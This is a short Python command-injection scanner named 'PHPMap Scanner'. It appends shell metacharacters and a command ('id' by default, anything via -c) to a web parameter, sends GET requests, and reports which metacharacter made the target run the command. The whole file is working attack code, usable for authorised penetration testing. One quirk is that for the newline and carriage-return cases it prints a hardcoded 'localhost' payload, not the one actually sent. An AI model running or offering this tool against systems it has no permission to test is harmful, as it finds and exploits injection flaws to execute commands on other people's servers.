import requests
import argparse

parser = argparse.ArgumentParser(description="PHPMap Scanner")
parser.add_argument("-u", "--url", help="Specify url", required=True)
parser.add_argument("-d", "--data", help="Specify valid data", required=True)
parser.add_argument("-c", "--cmd", help="Specify malicious command (optional)", default="id")
parser.add_argument("-o", "--outputs", help="Expected output indicators (optional)",default="uid") 
parser.add_argument("-p", "--params", help="Specify parameters", required=True)

args = parser.parse_args()

url = args.url
data = args.data
cmd = args.cmd
outputs = args.outputs
params = args.params

shell_metacharacters = [';', '|', '&', '&&', '||', '$', '>', '>>', '<', '`', '$()', '\\', '*', '?', '~', '(', ')', '[', ']', '\n', '\r']

try:
    print("[*] Scanning for command injection vulnerabilities...\n")
    for i in shell_metacharacters:
        payload = data + i + cmd
        try:
            response = requests.get(url, params={params: payload},timeout=5)
        except requests.exceptions.Timeout:
            print(f"[!] Timeout with metacharacter '{i}' — skipping")
            continue
        
        if outputs in response.text:
            if i=="\n":
                print(f"[!!] Injection likely with metacharacter \\n")
                print(f"     Payload: localhost\\nid")
                print("-" * 60)
            elif i=="\r":
                print(f"[!!] Injection likely with metacharacter \\r")
                print(f"     Payload: localhost\\rid")
                print("-" * 60)
            else:
                print(f"[!!] Injection likely with metacharacter '{i}'")
                print(f"     Payload: {payload}")
                print("-" * 60)
except KeyboardInterrupt:
    print("\n[!] Scan interrupted by user. Exiting cleanly.")
